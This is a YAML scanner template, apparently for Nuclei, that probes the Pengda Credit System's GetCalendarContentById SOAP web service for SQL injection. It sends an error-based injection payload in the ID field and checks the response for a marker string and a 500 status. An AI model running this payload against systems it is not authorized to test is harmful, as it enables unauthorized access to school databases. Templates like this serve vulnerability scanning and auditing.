config/pocs/pengda-credit-system-sqli.yaml

id: pengda-credit-system-sqli

info:
  name: Pengda Credit System - SQL Injection
  author: qwtd
  severity: high
  description: Pengda Credit System contains a SQL injection vulnerability.
  reference:
    - https://github.com/wy876/POC/blob/main/%E5%AD%A6%E5%88%86%E5%88%B6%E7%B3%BB%E7%BB%9F/%E5%AD%A6%E5%88%86%E5%88%B6%E7%B3%BB%E7%BB%9FGetCalendarContentById%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: 鹏达-学分制系统

http:
  - raw:
      - |
        POST /WebService_PantoSchool.asmx HTTP/1.1
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: close
        Cookie: ASP.NET_SessionId=e5l5acb3exqi5bmtezazrjsg
        Upgrade-Insecure-Requests: 1
        Priority: u=1
        SOAPAction: http://tempuri.org/GetCalendarContentById
        Content-Type: text/xml;charset=UTF-8
        Host: {{Hostname}}
        Content-Length: 314

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
          <soapenv:Header/>
          <soapenv:Body>
              <tem:GetCalendarContentById>
                <!--type: string-->
                <tem:ID>-7793' OR 7994 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(120)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (7994=7994) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(106)+CHAR(113))) AND 'qciT'='qciT</tem:ID>
              </tem:GetCalendarContentById>
          </soapenv:Body>
        </soapenv:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "qzxqq1qvpjq"
      - type: status
        status:
          - 500
